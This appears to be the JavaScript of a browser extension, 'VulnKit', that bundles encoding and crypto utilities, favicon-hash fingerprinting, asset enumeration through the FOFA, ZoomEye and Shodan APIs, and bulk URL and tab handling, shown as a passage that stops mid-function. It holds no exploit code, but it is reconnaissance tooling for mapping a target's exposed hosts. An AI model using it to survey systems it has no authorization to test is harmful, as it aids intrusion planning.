// VulnKit v5.0
(function () {
  'use strict';

  const ENCODING_NAMES = { base64: 'Base64', url: 'URL', html: 'HTML', hex: 'Hex' };
  let currentEncodingType = 'base64';
  let currentCryptoAlgo = 'aes';
  let currentAssetSource = 'fofa';

  const utils = {
    cache: new Map(),
    get(id) {
      if (!this.cache.has(id)) {
        this.cache.set(id, document.getElementById(id));
      }
      return this.cache.get(id);
    },
    escapeHtml(str) {
      if (!str) return '';
      return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
    },
    copyText(text) {
      navigator.clipboard.writeText(text).catch(() => {
        const ta = document.createElement('textarea');
        ta.value = text;
        document.body.appendChild(ta);
        ta.select();
        document.execCommand('copy');
        document.body.removeChild(ta);
      });
    },
    showToast: (() => {
      let current = null;
      const types = ['success', 'error', 'warning', 'info'];
      return function (message, type, duration) {
        if (current && current.parentNode) current.parentNode.removeChild(current);
        current = document.createElement('div');
        current.className = 'toast toast-' + (types.includes(type) ? type : 'info');
        current.textContent = message;
        document.body.appendChild(current);
        requestAnimationFrame(() => {
          if (current) current.classList.add('toast-show');
        });
        setTimeout(() => {
          if (current) {
            current.classList.remove('toast-show');
            setTimeout(() => {
              if (current && current.parentNode) {
                current.parentNode.removeChild(current);
                current = null;
              }
            }, 200);
          }
        }, duration || 2000);
      };
    })(),
  };

  // ====== Encoding Tools ======
  const encodingTools = {
    base64: {
      encode(t) {
        try {
          return btoa(unescape(encodeURIComponent(t)));
        } catch (e) {
          return 'Error: ' + e.message;
        }
      },
      decode(t) {
        try {
          const d = atob(t);
          const b = new Uint8Array(d.length);
          for (let i = 0; i < d.length; i++) b[i] = d.charCodeAt(i);
          return new TextDecoder().decode(b);
        } catch (e) {
          return 'Error: invalid Base64';
        }
      },
    },
    url: { encode: encodeURIComponent, decode: decodeURIComponent },
    html: {
      encode(t) {
        const d = document.createElement('div');
        d.textContent = t;
        return d.innerHTML;
      },
      decode(t) {
        const d = document.createElement('div');
        d.innerHTML = t;
        return d.textContent || '';
      },
    },
    hex: {
      encode(t) {
        return Array.from(new TextEncoder().encode(t))
          .map(b => b.toString(16).padStart(2, '0'))
          .join('');
      },
      decode(t) {
        return new TextDecoder().decode(
          new Uint8Array(t.match(/.{1,2}/g)?.map(b => parseInt(b, 16)) || [])
        );
      },
    },
  };

  function handleEncode() {
    const input = utils.get('encoding-input').value;
    if (!input) {
      utils.showToast('请输入文本', 'warning');
      return;
    }
    const result = encodingTools[currentEncodingType]?.encode(input);
    if (result === undefined) {
      utils.showToast('未知编码类型', 'error');
      return;
    }
    utils.get('encoding-output').value = result;
    utils.showToast('编码成功', 'success');
  }

  function handleDecode() {
    const input = utils.get('encoding-input').value;
    if (!input) {
      utils.showToast('请输入文本', 'warning');
      return;
    }
    const result = encodingTools[currentEncodingType]?.decode(input);
    if (result === undefined) {
      utils.showToast('未知编码类型', 'error');
      return;
    }
    utils.get('encoding-output').value = result;
    utils.showToast('解码成功', 'success');
  }

  function clearEncodingFields() {
    utils.get('encoding-input').value = '';
    utils.get('encoding-output').value = '';
  }

  function switchEncodingTab(type) {
    currentEncodingType = type;
    document.querySelectorAll('.sub-tab-btn').forEach(function (b) {
      b.classList.toggle('active', b.dataset.type === type);
    });
    var encSection = utils.get('enc-classic-section');
    var cryptoSection = utils.get('crypto-section');
    if (type === 'crypto') {
      if (encSection) encSection.classList.add('hidden');
      if (cryptoSection) cryptoSection.classList.remove('hidden');
      utils.get('card-title').textContent = '加密解密';
    } else {
      if (encSection) encSection.classList.remove('hidden');
      if (cryptoSection) cryptoSection.classList.add('hidden');
      utils.get('card-title').textContent = ENCODING_NAMES[type] + ' 编码/解码';
    }
  }

  // ====== Crypto (AES/DES/RC4/SM2/SM4/Bcrypt) ======
  function padOrTruncate(key, len) {
    if (!key) return key;
    key = key.toString();
    if (key.length >= len) return key.substring(0, len);
    while (key.length < len) key += '\0';
    return key;
  }

  function switchCryptoAlgo(algo) {
    currentCryptoAlgo = algo;
    document.querySelectorAll('.crypto-algo-btn').forEach(function (b) {
      b.classList.toggle('active', b.dataset.algo === algo);
    });
    document.querySelectorAll('.crypto-algo-panel').forEach(function (p) {
      p.classList.remove('active');
    });
    var panel = utils.get('algo-' + algo);
    if (panel) panel.classList.add('active');
    var encBtn = utils.get('crypto-enc-btn');
    var decBtn = utils.get('crypto-dec-btn');
    var verifyBtn = utils.get('crypto-verify-btn');
    if (algo === 'bcrypt') {
      if (encBtn) encBtn.textContent = '生成哈希';
      if (decBtn) decBtn.classList.add('hidden');
      if (verifyBtn) verifyBtn.classList.remove('hidden');
    } else {
      if (encBtn) encBtn.textContent = '加密';
      if (decBtn) decBtn.classList.remove('hidden');
      if (verifyBtn) verifyBtn.classList.add('hidden');
    }
  }

  function toggleIvVisibility(algoMode, ivGroupId, algoKey) {
    var ivGroup = utils.get(ivGroupId);
    if (!ivGroup) return;
    var modeEl = utils.get(algoKey);
    var mode = modeEl ? modeEl.value : '';
    if (mode === 'ECB' || mode === 'ecb') {
      ivGroup.classList.add('hidden');
    } else {
      ivGroup.classList.remove('hidden');
    }
  }

  function doCryptoEncrypt() {
    var input = (utils.get('crypto-input') || {}).value || '';
    if (!input) {
      utils.showToast('请输入内容', 'warning');
      return;
    }
    var output = utils.get('crypto-output');
    if (!output) return;
    try {
      var result;
      switch (currentCryptoAlgo) {
        case 'aes':
          result = aesEncrypt(input);
          break;
        case 'des':
          result = desEncrypt(input);
          break;
        case 'rc4':
          result = rc4Encrypt(input);
          break;
        case 'sm2':
          result = sm2Encrypt(input);
          break;
        case 'sm4':
          result = sm4Encrypt(input);
          break;
        case 'bcrypt':
          result = bcryptHash(input);
          break;
        case 'rsa':
          rsaEncrypt(input)
            .then(function (r) {
              output.value = r;
              utils.showToast('加密成功', 'success');
            })
            .catch(function (e) {
              output.value = '错误: ' + e.message;
              utils.showToast('加密失败', 'error');
            });
          return;
        default:
          return;
      }
      output.value = result;
      utils.showToast('加密成功', 'success');
    } catch (e) {
      output.value = '错误: ' + e.message;
      utils.showToast('加密失败: ' + e.message, 'error');
    }
  }

  function doCryptoDecrypt() {
    var input = (utils.get('crypto-input') || {}).value || '';
    if (!input) {
      utils.showToast('请输入密文', 'warning');
      return;
    }
    var output = utils.get('crypto-output');
    if (!output) return;
    try {
      var result;
      switch (currentCryptoAlgo) {
        case 'aes':
          result = aesDecrypt(input);
          break;
        case 'des':
          result = desDecrypt(input);
          break;
        case 'rc4':
          result = rc4Decrypt(input);
          break;
        case 'sm2':
          result = sm2Decrypt(input);
          break;
        case 'sm4':
          result = sm4Decrypt(input);
          break;
        case 'rsa':
          rsaDecrypt(input)
            .then(function (r) {
              output.value = r;
              utils.showToast('解密成功', 'success');
            })
            .catch(function (e) {
              output.value = '错误: ' + e.message;
              utils.showToast('解密失败', 'error');
            });
          return;
        default:
          output.value = '该算法不支持解密';
          return;
      }
      output.value = result;
      utils.showToast('解密成功', 'success');
    } catch (e) {
      output.value = '错误: ' + e.message;
      utils.showToast('解密失败: ' + e.message, 'error');
    }
  }

  function doCryptoVerify() {
    var input = (utils.get('crypto-input') || {}).value || '';
    var hash = (utils.get('crypto-output') || {}).value || '';
    if (!input || !hash) {
      utils.showToast('请输入密码和哈希', 'warning');
      return;
    }
    if (currentCryptoAlgo !== 'bcrypt') return;
    try {
      var match = dcodeIO.bcrypt.compareSync(input, hash);
      utils.showToast(match ? '验证通过' : '验证失败', match ? 'success' : 'error');
    } catch (e) {
      utils.showToast('验证失败: ' + e.message, 'error');
    }
  }

  function aesEncrypt(input) {
    var mode = (utils.get('aes-mode') || {}).value || 'CBC';
    var keySize = parseInt((utils.get('aes-keysize') || {}).value) || 128;
    var padding = (utils.get('aes-padding') || {}).value || 'Pkcs7';
    var key = padOrTruncate((utils.get('aes-key') || {}).value, keySize / 8);
    if (!key || key.length < 1) throw new Error('请输入密钥');
    var opts = {
      mode: CryptoJS.mode[mode],
      padding: CryptoJS.pad[padding],
    };
    if (mode !== 'ECB') {
      var iv = padOrTruncate((utils.get('aes-iv') || {}).value, 16);
      opts.iv = CryptoJS.enc.Utf8.parse(iv);
    }
    var keyWA = CryptoJS.enc.Utf8.parse(key);
    var data = CryptoJS.enc.Utf8.parse(input);
    return CryptoJS.AES.encrypt(data, keyWA, opts).toString();
  }

  function aesDecrypt(input) {
    var mode = (utils.get('aes-mode') || {}).value || 'CBC';
    var keySize = parseInt((utils.get('aes-keysize') || {}).value) || 128;
    var padding = (utils.get('aes-padding') || {}).value || 'Pkcs7';
    var key = padOrTruncate((utils.get('aes-key') || {}).value, keySize / 8);
    if (!key || key.length < 1) throw new Error('请输入密钥');
    var opts = {
      mode: CryptoJS.mode[mode],
      padding: CryptoJS.pad[padding],
    };
    if (mode !== 'ECB') {
      var iv = padOrTruncate((utils.get('aes-iv') || {}).value, 16);
      opts.iv = CryptoJS.enc.Utf8.parse(iv);
    }
    var keyWA = CryptoJS.enc.Utf8.parse(key);
    var bytes = CryptoJS.AES.decrypt(input, keyWA, opts);
    return CryptoJS.enc.Utf8.stringify(bytes);
  }

  function desEncrypt(input) {
    var mode = (utils.get('des-mode') || {}).value || 'CBC';
    var padding = (utils.get('des-padding') || {}).value || 'Pkcs7';
    var key = padOrTruncate((utils.get('des-key') || {}).value, 8);
    if (!key || key.length < 8) throw new Error('密钥需 8 字符');
    var opts = { mode: CryptoJS.mode[mode], padding: CryptoJS.pad[padding] };
    if (mode !== 'ECB') {
      var iv = padOrTruncate((utils.get('des-iv') || {}).value, 8);
      opts.iv = CryptoJS.enc.Utf8.parse(iv);
    }
    return CryptoJS.DES.encrypt(
      CryptoJS.enc.Utf8.parse(input),
      CryptoJS.enc.Utf8.parse(key),
      opts
    ).toString();
  }

  function desDecrypt(input) {
    var mode = (utils.get('des-mode') || {}).value || 'CBC';
    var padding = (utils.get('des-padding') || {}).value || 'Pkcs7';
    var key = padOrTruncate((utils.get('des-key') || {}).value, 8);
    if (!key || key.length < 8) throw new Error('密钥需 8 字符');
    var opts = { mode: CryptoJS.mode[mode], padding: CryptoJS.pad[padding] };
    if (mode !== 'ECB') {
      var iv = padOrTruncate((utils.get('des-iv') || {}).value, 8);
      opts.iv = CryptoJS.enc.Utf8.parse(iv);
    }
    var bytes = CryptoJS.DES.decrypt(input, CryptoJS.enc.Utf8.parse(key), opts);
    return CryptoJS.enc.Utf8.stringify(bytes);
  }

  function rc4Encrypt(input) {
    var key = (utils.get('rc4-key') || {}).value || '';
    if (!key) throw new Error('请输入密钥');
    return CryptoJS.RC4.encrypt(CryptoJS.enc.Utf8.parse(input), key).toString();
  }

  function rc4Decrypt(input) {
    var key = (utils.get('rc4-key') || {}).value || '';
    if (!key) throw new Error('请输入密钥');
    var bytes = CryptoJS.RC4.decrypt(input, key);
    return CryptoJS.enc.Utf8.stringify(bytes);
  }

  function sm2Encrypt(input) {
    var pubKey = (utils.get('sm2-pubkey') || {}).value || '';
    if (!pubKey) throw new Error('请输入公钥');
    if (pubKey.length === 128) pubKey = '04' + pubKey;
    if (pubKey.length !== 130 || !pubKey.startsWith('04'))
      throw new Error('公钥格式错误（需 130 位十六进制，04 开头）');
    var cipherMode = parseInt((utils.get('sm2-cipher') || {}).value) || 1;
    return sm2.doEncrypt(
      input.split('').map(function (c) {
        return c.charCodeAt(0);
      }),
      pubKey,
      cipherMode
    );
  }

  function sm2Decrypt(input) {
    var priKey = (utils.get('sm2-prikey') || {}).value || '';
    if (!priKey) throw new Error('请输入私钥');
    var cipherMode = parseInt((utils.get('sm2-cipher') || {}).value) || 1;
    var decrypted = sm2.doDecrypt(input, priKey, cipherMode, { output: 'array' });
    if (!decrypted) throw new Error('解密失败，请检查密钥和密文');
    return decrypted
      .map(function (c) {
        return String.fromCharCode(c);
      })
      .join('');
  }

  function sm4Encrypt(input) {
    var key = (utils.get('sm4-key') || {}).value || '';
    if (!key || key.length !== 16) throw new Error('密钥需 16 字符');
    var isCbc = (utils.get('sm4-mode') || {}).value === 'cbc';
    var usePadding = (utils.get('sm4-padding') || {}).checked !== false;
    var keyHex = Array.from(key)
      .map(function (c) {
        return c.charCodeAt(0).toString(16).padStart(2, '0');
      })
      .join('');
    var iv = '';
    if (isCbc) {
      var ivVal = (utils.get('sm4-iv') || {}).value || '';
      iv = Array.from(ivVal)
        .map(function (c) {
          return c.charCodeAt(0).toString(16).padStart(2, '0');
        })
        .join('');
    }
    return sm4.encrypt(input, keyHex, {
      padding: usePadding ? 'pkcs#5' : 'none',
      mode: isCbc ? 'cbc' : undefined,
      iv: isCbc ? iv : undefined,
    });
  }

  function sm4Decrypt(input) {
    var key = (utils.get('sm4-key') || {}).value || '';
    if (!key || key.length !== 16) throw new Error('密钥需 16 字符');
    var isCbc = (utils.get('sm4-mode') || {}).value === 'cbc';
    var usePadding = (utils.get('sm4-padding') || {}).checked !== false;
    var keyHex = Array.from(key)
      .map(function (c) {
        return c.charCodeAt(0).toString(16).padStart(2, '0');
      })
      .join('');
    var iv = '';
    if (isCbc) {
      var ivVal = (utils.get('sm4-iv') || {}).value || '';
      iv = Array.from(ivVal)
        .map(function (c) {
          return c.charCodeAt(0).toString(16).padStart(2, '0');
        })
        .join('');
    }
    return sm4.decrypt(input, keyHex, {
      padding: usePadding ? 'pkcs#5' : 'none',
      mode: isCbc ? 'cbc' : undefined,
      iv: isCbc ? iv : undefined,
    });
  }

  function bcryptHash(input) {
    var rounds = parseInt((utils.get('bcrypt-rounds') || {}).value) || 10;
    var salt = dcodeIO.bcrypt.genSaltSync(rounds);
    return dcodeIO.bcrypt.hashSync(input, salt);
  }

  function rsaEncrypt(input) {
    var pubKeyStr = (utils.get('rsa-pubkey') || {}).value || '';
    if (!pubKeyStr) throw new Error('请先生成密钥对');
    return window.crypto.subtle
      .importKey(
        'spki',
        pemToArrayBuffer(pubKeyStr),
        { name: 'RSA-OAEP', hash: 'SHA-256' },
        false,
        ['encrypt']
      )
      .then(function (pubKey) {
        return window.crypto.subtle.encrypt(
          { name: 'RSA-OAEP' },
          pubKey,
          new TextEncoder().encode(input)
        );
      })
      .then(function (buf) {
        return btoa(String.fromCharCode.apply(null, new Uint8Array(buf)));
      });
  }

  function rsaDecrypt(input) {
    var priKeyStr = (utils.get('rsa-prikey') || {}).value || '';
    if (!priKeyStr) throw new Error('请先生成密钥对');
    return window.crypto.subtle
      .importKey(
        'pkcs8',
        pemToArrayBuffer(priKeyStr),
        { name: 'RSA-OAEP', hash: 'SHA-256' },
        true,
        ['decrypt']
      )
      .then(function (priKey) {
        var bin = atob(input);
        var buf = new Uint8Array(bin.length);
        for (var i = 0; i < bin.length; i++) buf[i] = bin.charCodeAt(i);
        return window.crypto.subtle.decrypt({ name: 'RSA-OAEP' }, priKey, buf);
      })
      .then(function (buf) {
        return new TextDecoder().decode(buf);
      });
  }

  function rsaGenerateKeyPair() {
    var keySize = parseInt((utils.get('rsa-keysize') || {}).value) || 2048;
    var btn = utils.get('rsa-genkey-btn');
    if (btn) {
      btn.disabled = true;
      btn.textContent = '生成中...';
    }
    window.crypto.subtle
      .generateKey(
        {
          name: 'RSA-OAEP',
          modulusLength: keySize,
          publicExponent: new Uint8Array([1, 0, 1]),
          hash: 'SHA-256',
        },
        true,
        ['encrypt', 'decrypt']
      )
      .then(function (keyPair) {
        return Promise.all([
          window.crypto.subtle.exportKey('spki', keyPair.publicKey),
          window.crypto.subtle.exportKey('pkcs8', keyPair.privateKey),
        ]);
      })
      .then(function (results) {
        var pubEl = utils.get('rsa-pubkey');
        var priEl = utils.get('rsa-prikey');
        if (pubEl) pubEl.value = ab2pem(results[0], 'PUBLIC KEY');
        if (priEl) priEl.value = ab2pem(results[1], 'PRIVATE KEY');
        if (btn) {
          btn.disabled = false;
          btn.textContent = '生成密钥对';
        }
        utils.showToast(keySize + ' 位密钥对已生成', 'success');
      })
      .catch(function (e) {
        if (btn) {
          btn.disabled = false;
          btn.textContent = '生成密钥对';
        }
        utils.showToast('生成失败', 'error');
      });
  }

  function ab2pem(buffer, label) {
    var b64 = btoa(String.fromCharCode.apply(null, new Uint8Array(buffer)));
    var lines = b64.match(/.{1,64}/g) || [];
    return '-----BEGIN ' + label + '-----\n' + lines.join('\n') + '\n-----END ' + label + '-----';
  }

  function pemToArrayBuffer(pem) {
    var b64 = pem
      .replace(/-----BEGIN [A-Z ]+-----/, '')
      .replace(/-----END [A-Z ]+-----/, '')
      .replace(/\s/g, '');
    var bin = atob(b64);
    var buf = new Uint8Array(bin.length);
    for (var i = 0; i < bin.length; i++) buf[i] = bin.charCodeAt(i);
    return buf.buffer;
  }

  // ====== Favicon (MMH3 Hash) ======
  function mm3hash32(str) {
    const seed = 0;
    const c1 = 0xcc9e2d51;
    const c2 = 0x1b873593;
    const h1 = seed | 0;
    const round = (h1, k1) => {
      k1 = Math.imul(k1, c1);
      k1 = (k1 << 15) | (k1 >>> 17);
      k1 = Math.imul(k1, c2);
      h1 ^= k1;
      h1 = (h1 << 13) | (h1 >>> 19);
      return (Math.imul(h1, 5) + 0xe6546b64) | 0;
    };
    let h = h1;
    const bytes = new TextEncoder().encode(str);
    const len = bytes.length;
    const nblocks = len >> 2;
    for (let i = 0; i < nblocks; i++) {
      const k1 =
        bytes[i * 4] |
        (bytes[i * 4 + 1] << 8) |
        (bytes[i * 4 + 2] << 16) |
        (bytes[i * 4 + 3] << 24);
      h = round(h, k1);
    }
    let k1 = 0;
    const tail = nblocks * 4;
    switch (len & 3) {
      case 3:
        k1 ^= bytes[tail + 2] << 16;
      case 2:
        k1 ^= bytes[tail + 1] << 8;
      case 1:
        k1 ^= bytes[tail];
        h = round(h, k1);
    }
    h ^= len;
    h ^= h >>> 16;
    h = Math.imul(h, 0x85ebca6b);
    h ^= h >>> 13;
    h = Math.imul(h, 0xc2b2ae35);
    h ^= h >>> 16;
    return (h >>> 0).toString(10);
  }

  async function extractFavicon() {
    try {
      const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
      if (!tab?.url) {
        utils.showToast('无法获取当前页面', 'error');
        return;
      }

      const url = new URL(tab.url);
      const domain = url.hostname;

      const results = await chrome.scripting.executeScript({
        target: { tabId: tab.id },
        func: () => {
          const links = document.querySelectorAll('link[rel*="icon"], link[rel="shortcut icon"]');
          if (links.length > 0) return links[0].href;
          return '/favicon.ico';
        },
      });

      const faviconUrl = results?.[0]?.result || `https://${domain}/favicon.ico`;
      const resolvedUrl = new URL(faviconUrl, tab.url).href;

      utils.get('favicon-img').src = resolvedUrl;
      utils.get('favicon-img').classList.remove('hidden');
      utils.get('favicon-placeholder').classList.add('hidden');
      utils.get('favicon-url').textContent = resolvedUrl;

      try {
        const resp = await fetch(resolvedUrl);
        const buf = await resp.arrayBuffer();
        const bytes = new Uint8Array(buf);

        let binary = '';
        for (let i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i]);
        const b64 = btoa(binary);
        const faviconHash = mm3hash32(b64);
        utils.get('favicon-hash').textContent = '-' + faviconHash;

        const platforms = [
          {
            name: 'Shodan',
            url: 'https://www.shodan.io/search?query=http.favicon.hash%3A' + faviconHash,
            color: '#4A90E2',
          },
          {
            name: 'FOFA',
            url: 'https://fofa.info/result?qbase64=' + btoa('icon_hash="-' + faviconHash + '"'),
            color: '#10b981',
          },
          {
            name: 'ZoomEye',
            url: 'https://www.zoomeye.org/searchResult?q=iconhash%3A' + faviconHash,
            color: '#f59e0b',
          },
          {
            name: 'Quake',
            url:
              'https://quake.360.net/quake/#/searchResult?q=app.iconhash%3A%22' +
              faviconHash +
              '%22',
            color: '#ef4444',
          },
          {
            name: 'Hunter',
            url: 'https://hunter.qianxin.com/searchResult?q=web.icon%3D%22' + faviconHash + '%22',
            color: '#8b5cf6',
          },
        ];

        const linksContainer = utils.get('favicon-search-links');
        linksContainer.innerHTML = platforms
          .map(
            p =>
              '<a class="favicon-search-link" href="' +
              p.url +
              '" target="_blank">' +
              p.name +
              '</a>'
          )
          .join('');
      } catch {
        utils.get('favicon-hash').textContent = '获取失败';
      }

      utils.showToast('图标提取成功', 'success');
    } catch (e) {
      utils.showToast('提取失败: ' + e.message, 'error');
    }
  }

  // ====== Asset Mapping ======
  async function getApiKey(source) {
    return new Promise(resolve => {
      chrome.storage.local.get(['pentest_keys'], result => {
        const keys = result.pentest_keys || {};
        if (source === 'fofa') resolve({ email: keys.fofa_email, key: keys.fofa_key });
        else if (source === 'zoomeye') resolve(keys.zoomeye);
        else if (source === 'shodan') resolve(keys.shodan);
        else resolve(null);
      });
    });
  }

  async function getCurrentUrl() {
    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    return tab?.url || null;
  }

  async function getCurrentDomain() {
    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    if (!tab?.url) return null;
    try {
      return new URL(tab.url).hostname;
    } catch {
      return null;
    }
  }

  function setAssetStatus(text) {
    utils.get('asset-status').textContent = text;
  }

  function renderAssetResults(data) {
    const container = utils.get('asset-results');
    if (!data || data.length === 0) {
      container.innerHTML = '<div class="empty-state">未找到结果</div>';
      return;
    }
    let html = '<div class="asset-count">共 ' + data.length + ' 条结果</div>';
    html +=
      '<table class="asset-table"><thead><tr><th>IP/域名</th><th>端口</th><th>协议</th><th>标题</th></tr></thead><tbody>';
    data.forEach(item => {
      html += '<tr>';
      html +=
        '<td title="' +
        utils.escapeHtml(item.host || '') +
        '">' +
        utils.escapeHtml(item.host || '-') +
        '</td>';
      html += '<td>' + utils.escapeHtml(String(item.port || '-')) + '</td>';
      html += '<td>' + utils.escapeHtml(item.protocol || '-') + '</td>';
      html +=
        '<td title="' +
        utils.escapeHtml(item.title || '') +
        '">' +
        utils.escapeHtml(item.title || '-') +
        '</td>';
      html += '</tr>';
    });
    html += '</tbody></table>';
    container.innerHTML = html;
  }

  async function scanFofa(query) {
    const keys = await getApiKey('fofa');
    if (!keys?.email || !keys?.key) {
      utils.showToast('请先配置 FOFA API Key', 'warning');
      return;
    }
    setAssetStatus('正在查询 FOFA...');
    const qbase64 = btoa(unescape(encodeURIComponent('domain="' + query + '"')));
    const url =
      'https://fofa.info/api/v1/search/all?email=' +
      encodeURIComponent(keys.email) +
      '&key=' +
      encodeURIComponent(keys.key) +
      '&qbase64=' +
      qbase64 +
      '&fields=host,port,protocol,title&size=100';

    chrome.runtime.sendMessage({ type: 'FETCH_URL', url }, response => {
      if (response?.error) {
        setAssetStatus('查询失败: ' + response.error);
        return;
      }
      try {
        const json = JSON.parse(response.data);
        if (json.error) {
          setAssetStatus('API 错误: ' + json.error);
          return;
        }
        const results = (json.results || []).map(r => ({
          host: r[0],
          port: r[1],
          protocol: r[2],
          title: r[3],
        }));
        setAssetStatus('FOFA: 查询完成');
        renderAssetResults(results);
      } catch {
        setAssetStatus('解析结果失败');
      }
    });
  }

  async function scanZoomEye(query) {
    const key = await getApiKey('zoomeye');
    if (!key) {
      utils.showToast('请先配置 ZoomEye API Key', 'warning');
      return;
    }
    setAssetStatus('正在查询 ZoomEye...');
    const url =
      'https://api.zoomeye.org/host/search?query=' +
      encodeURIComponent('hostname:' + query) +
      '&page=1';

    chrome.runtime.sendMessage(
      { type: 'FETCH_URL_AUTH', url, key, header: 'API-KEY' },
      response => {
        if (response?.error) {
          setAssetStatus('查询失败: ' + response.error);
          return;
        }
        try {
          const json = JSON.parse(response.data);
          const results = (json.matches || []).map(r => ({
            host: r.ip || '-',
            port: r.portinfo?.port || '-',
            protocol: r.portinfo?.type || '-',
            title: r.webinfo?.title || '-',
          }));
          setAssetStatus('ZoomEye: 查询完成');
          renderAssetResults(results);
        } catch {
          setAssetStatus('解析结果失败');
        }
      }
    );
  }

  async function scanShodan(query) {
    const key = await getApiKey('shodan');
    if (!key) {
      utils.showToast('请先配置 Shodan API Key', 'warning');
      return;
    }
    setAssetStatus('正在查询 Shodan...');
    const url = 'https://api.shodan.io/shodan/host/' + query + '?key=' + encodeURIComponent(key);

    chrome.runtime.sendMessage({ type: 'FETCH_URL', url }, response => {
      if (response?.error) {
        setAssetStatus('查询失败: ' + response.error);
        return;
      }
      try {
        const json = JSON.parse(response.data);
        if (json.error) {
          setAssetStatus('API 错误: ' + json.error);
          return;
        }
        const results = (json.data || []).map(d => ({
          host: json.ip_str || query,
          port: d.port || '-',
          protocol: d._shodan?.module || '-',
          title: d.http?.title || '-',
        }));
        setAssetStatus('Shodan: 查询完成');
        renderAssetResults(results);
      } catch {
        setAssetStatus('解析结果失败');
      }
    });
  }

  async function handleAssetScan() {
    let query = utils.get('asset-query').value.trim();
    if (!query) {
      query = await getCurrentDomain();
      if (!query) {
        utils.showToast('请输入目标或打开一个网页', 'warning');
        return;
      }
      utils.get('asset-query').value = query;
    }

    const scanners = { fofa: scanFofa, zoomeye: scanZoomEye, shodan: scanShodan };
    const scanner = scanners[currentAssetSource];
    if (scanner) scanner(query);
  }

  function switchAssetSource(source) {
    currentAssetSource = source;
    document
      .querySelectorAll('.source-btn')
      .forEach(b => b.classList.toggle('active', b.dataset.source === source));
    utils.get('asset-results').innerHTML = '';
    setAssetStatus('');
  }

  function saveApiKeys() {
    const keys = {
      fofa_email: utils.get('key-fofa-email').value.trim(),
      fofa_key: utils.get('key-fofa-key').value.trim(),
      zoomeye: utils.get('key-zoomeye').value.trim(),
      shodan: utils.get('key-shodan').value.trim(),
    };
    chrome.storage.local.set({ pentest_keys: keys }, () => {
      utils.showToast('配置已保存', 'success');
    });
  }

  function loadApiKeys() {
    chrome.storage.local.get(['pentest_keys'], result => {
      const keys = result.pentest_keys || {};
      if (utils.get('key-fofa-email')) utils.get('key-fofa-email').value = keys.fofa_email || '';
      if (utils.get('key-fofa-key')) utils.get('key-fofa-key').value = keys.fofa_key || '';
      if (utils.get('key-zoomeye')) utils.get('key-zoomeye').value = keys.zoomeye || '';
      if (utils.get('key-shodan')) utils.get('key-shodan').value = keys.shodan || '';
    });
  }

  function clearApiKeys() {
    chrome.storage.local.remove(['pentest_keys'], () => {
      utils.get('key-fofa-email').value = '';
      utils.get('key-fofa-key').value = '';
      utils.get('key-zoomeye').value = '';
      utils.get('key-shodan').value = '';
      utils.showToast('配置已清除', 'success');
    });
  }

  // ====== URL Multi-Open ======
  function parseUrls() {
    const text = utils.get('multiurl-input').value;
    return text
      .split(/[\n\r]+/)
      .map(line => {
        let url = line.trim();
        if (!url) return null;
        if (!/^https?:\/\//i.test(url)) url = 'http://' + url;
        return url;
      })
      .filter(Boolean);
  }

  function updateMultiurlInfo(count) {
    const el = utils.get('multiurl-info');
    if (el) el.textContent = count > 0 ? '已识别 ' + count + ' 个 URL' : '';
  }

  function handleMultiurlOpen() {
    const urls = parseUrls();
    if (urls.length === 0) {
      utils.showToast('请输入URL', 'warning');
      return;
    }
    if (urls.length > 50) {
      utils.showToast('一次最多打开 50 个', 'warning');
      return;
    }
    urls.forEach(url => chrome.tabs.create({ url, active: false }));
    utils.showToast('已打开 ' + urls.length + ' 个标签页', 'success');
  }

  function handleMultiurlDedup() {
    const urls = parseUrls();
    const unique = [...new Set(urls)];
    if (unique.length === urls.length) {
      utils.showToast('没有重复URL', 'info');
      return;
    }
    utils.get('multiurl-input').value = unique.join('\n');
    updateMultiurlInfo(unique.length);
    utils.showToast('去重完成，移除 ' + (urls.length - unique.length) + ' 个重复', 'success');
  }

  // ====== Tab Save ======
  var savedTabUrls = [];

  async function grabAllTabs() {
    var grabBtn = utils.get('tabsave-grab-btn');
    var copyBtn = utils.get('tabsave-copy-btn');
    var exportBtn = utils.get('tabsave-export-btn');
    var statusEl = utils.get('tabsave-status');
    if (grabBtn) grabBtn.disabled = true;
    if (statusEl) statusEl.textContent = '正在获取...';

    try {
      var tabs = await chrome.tabs.query({});
      savedTabUrls = tabs
        .map(function (t) {
          try {
            var u = new URL(t.url);
            if (
              u.protocol === 'chrome:' ||
              u.protocol === 'chrome-extension:' ||
              u.protocol === 'about:' ||
              u.protocol === 'edge:'
            )
              return null;
            return { url: t.url, title: t.title || '', id: t.id };
          } catch (e) {
            return null;
          }
        })
        .filter(Boolean);

      // Dedup by url
      var seen = {};
      savedTabUrls = savedTabUrls.filter(function (t) {
        if (seen[t.url]) return false;
        seen[t.url] = true;
        return true;
      });

      if (statusEl) statusEl.textContent = '已获取 ' + savedTabUrls.length + ' 个标签页（已去重）';
      if (copyBtn) copyBtn.disabled = false;
      if (exportBtn) exportBtn.disabled = false;
      utils.showToast('已获取 ' + savedTabUrls.length + ' 个标签页', 'success');
    } catch (e) {
      if (statusEl) statusEl.textContent = '获取失败';
      utils.showToast('获取失败: ' + e.message, 'error');
    }
    if (grabBtn) grabBtn.disabled = false;
  }

  function copySavedTabUrls() {
    if (savedTabUrls.length === 0) {
      utils.showToast('请先获取标签页', 'warning');
      return;
    }
    var text = savedTabUrls
      .map(function (t) {
        return t.url;
      })
      .join('\n');
    utils.copyText(text);
    utils.showToast('已复制 ' + savedTabUrls.length + ' 个 URL', 'success');
  }

  function exportSavedTabUrls() {
    if (savedTabUrls.length === 0) {
      utils.showToast('请先获取标签页', 'warning');
      return;
    }
    var lines = savedTabUrls.map(function (t) {
      return t.title + '\n' + t.url;
    });
    var text = lines.join('\n\n');
    var blob = new Blob([text], { type: 'text/plain;charset=utf-8' });
    var url = URL.createObjectURL(blob);
    var a = document.createElement('a');
    a.href = url;
    var now = new Date();
    var ts =
      now.getFullYear() +
      '-' +
      String(now.getMonth() + 1).padStart(2, '0') +
      '-' +
      String(now.getDate()).padStart(2, '0') +
      '_' +
      String(now.getHours()).padStart(2, '0') +
      String(now.getMinutes()).padStart(2, '0');
    a.download = 'tabs_' + ts + '.txt';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
